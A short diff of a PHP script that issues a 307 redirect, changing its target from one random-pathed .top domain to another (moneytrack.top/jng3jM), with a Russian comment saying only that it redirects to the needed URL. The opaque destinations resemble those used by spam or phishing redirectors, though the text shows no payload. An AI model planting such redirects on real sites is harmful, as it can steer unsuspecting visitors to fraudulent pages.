@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://aahypermarkdev.top/Bysnx3');
+header('Location: https://moneytrack.top/jng3jM');
 exit();
 ?>
